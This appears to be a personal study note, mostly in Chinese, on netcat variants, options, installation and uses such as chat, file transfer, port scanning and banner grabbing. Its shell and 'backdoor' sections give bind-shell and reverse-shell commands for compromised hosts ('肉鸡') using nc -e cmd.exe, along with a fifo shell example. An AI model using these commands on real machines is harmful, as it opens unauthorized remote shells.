
apt-cache search netcat-

    1. netcat-traditional - TCP/IP swiss army knife    这个是默认的, 没有-d

    1. netcat-openbsd - TCP/IP swiss army knife        这个有-d

    1. GNU netcat

        这个需要手动安装，有 -L 选项


如果同时安装了这两个，如何选择运行哪个呢?
    whereis nc
    /usr/bin/nc.openbsd         我是后安装的这个openbsd版本的，默认是这个
    /usr/bin/nc.traditional


    ➜  ll /usr/bin/nc
    lrwxrwxrwx 1 root root 20 Mar  9  2020 /usr/bin/nc -> /etc/alternatives/nc

    ➜  ll /etc/alternatives/nc
    lrwxrwxrwx 1 root root 15 Dec 29 23:05 /etc/alternatives/nc -> /bin/nc.openbsd



## SYNOPSIS
    nc [-options] hostname port[s] [ports] ...
    nc -l -p port [-options] [hostname] [port]

## OPTIONS(traditional)

    -e filename  specify  filename  to exec after connect (use with caution).
                 See the -c option for enhanced functionality.


    -l           listen mode, for inbound connects

    -n           numeric-only IP addresses, no DNS

    -p port      local  port  number  (port  numbers  can  be  individual or ranges: lo-hi [inclusive])

    -b           allow UDP broadcasts

    -r           randomize local and remote ports

    -s addr      local source address 隐藏ip

    -t           enable telnet negotiation  回复telnet请求

    -u           UDP mode

    -v           verbose [use twice to be more verbose]

    -w secs      timeout for connects and final net reads
                 -w3

    -C           Send CRLF as line-ending

    -z           zero-I/O mode [used for scanning]
                 (对目标IP发送的数据包中不包含任何payload, 这样做可以加快扫描速度)

    -T type      set  TOS  flag (type may be one of "Minimize-Delay", "Maxi‐mize-Throughput",  "Maximize-Reliability",  or   "Minimize-Cost".)

    ?-g gateway   source-routing hop point[s], up to 8

    ?-G num       source-routing pointer: 4, 8, 12, ...

    -i secs      delay interval for lines sent, ports scanned

    ?-L
                两个版本都没有这个选项
                同 -l, 党客户端断开，服务端依旧回到等待状态

### options(nc.openbsd)

    ```
    There is no -c or -e option in this netcat, but you still can execute a
    command after connection being established by redirecting file descrip‐
    tors. Be cautious here because opening a port and let anyone connected ex‐
    ecute arbitrary command on your site is DANGEROUS. If you really need to
    do this, here is an example:

    On ‘server’ side:

    $ rm -f /tmp/f; mkfifo /tmp/f
    $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

    On ‘client’ side:

    $ nc host.example.com 1234
    $ (shell prompt from host.example.com)

    By doing this, you create a fifo at /tmp/f and make nc listen at port 1234
    of address 127.0.0.1 on ‘server’ side, when a ‘client’ establishes a con‐
    nection successfully to that port, /bin/sh gets executed on ‘server’ side
    and the shell prompt is given to ‘client’ side.

    When connection is terminated, nc quits as well. Use -k if you want it
    keep listening, but if the command quits this option won't restart it or
    keep nc running. Also don't forget to remove the file descriptor once you
    don't need it anymore:

    $ rm -f /tmp/f

    ```

### GNU netcat

http://netcat.sourceforge.net/download.php

```
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz

tar -zxvf ./netcat-0.7.1.tar.gz

cd /usr/local/netcat-0.7.1

./configure --prefix=/opt/module/netcat

make && make install


环境变量

vi /etc/profile
export NETCAT_HOME=/opt/module/etcat/bin
export PATH=$NETCAT_HOME/bin:$PATH

重新载入配置文件： 
    [root@hadoop02 netcat]# source /etc/profile

```


## USAGE

创建一个服务器端方法

    nc -l -p [localport]

创建一个客户端方法(连接服务器端)

    nc [server_addr] [server_port]
       服务器ip      服务器端口号


### 聊天应用

   ```server ip 192.168.254.1

   服务器端

       nc -l -p 9999

   客户端: 

       nc 192.168.254.1 9999

   ```

### 返回 Shell

主要使用了 -e 选项


```服务器端

nc -l -p -e cmd.exe
nc -l -p -e /usr/bin/bash


```



### 文件传输

应用场景

1. 取证
    当目标机器被黑客攻击之后, 取证人员可以利用 nc 的文件传输功能来获取目标机器上的文件内容
    避免直接在目标及其上进行操作造成取证的误差

2. 单纯获取目标机器敏感文件
    当目标及其上有一些文件内容，无法正常下载时，可以利用nc进行文件传输

原理
    nc中的数据传输，实用的是标准输入、输出流，所以可以利用命令来进行操作


    ```服务器端接收文件

    服务器端接收文件
        nc -l -p [localport] > outfile

    客户端发送文件
        nc [server_ip] [server_port] < infile

    当客户端 ctrl + c 后，服务器端会自动中断

    ```



    ```服务器端发送文件

    服务器端发送文件
        nc -l -p [localport] < outfile

    客户端接收文件
        nc [server_ip] [server_port] > infile

    当客户端 ctrl + c 后，服务器端会自动中断

    ```


### 信息探测

-n 
-v
-z
-w

nc -n -v -z -w1 [target_ip] [target_port_start-target_port_end]

先扫描高端口，再扫描低端口

openvpn 端口 nc 和 nmap 都没有扫出来

1. 目标内网的IP和端口进行扫描


2. 对某个目标进行端口探测


3. 对目标的服务 banner 进行抓取(还是目标端口)

    echo " " | nc -v -n -w1 [target_ip] [target_port_start-target_port_end]



    ```
    nc baidu.com 80
    GET / HTTP/1.1
    回车


    ---
    nc baidu.com 80
    HTTP/1.1

    ```


    ```
    ➜  ~ telnet 10.1.1.1 22
    Trying 10.1.1.1...
    Connected to 10.1.1.1.
    Escape character is '^]'.
    SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
    quit
    Connection closed by foreign host.

    ➜  ~ nc 10.1.1.1 22
    SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

    nmap -A 10.1.1.1 -p22
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

    ```


### 建立后门

    ```监听型后门

    肉鸡(windows)
    nc -l -p [port] -e cmd.exe

    黑客(linux)
    nc [server_ip] [port] 

    
    肉鸡做server端

    黑客去连接肉鸡

    ```

    ```连接型后门

    服务器(linux)
    nc -l -p 4000


    肉鸡(windows)
    nc [server_ip] [server_port] -e cmd.exe
    

    肉鸡做客户端，
    黑客做服务器端

    ```


### 端口转发

    ```???
    nc -l -p 9999 | nc baidu.com 80 | nc -l -p 9999
    ```


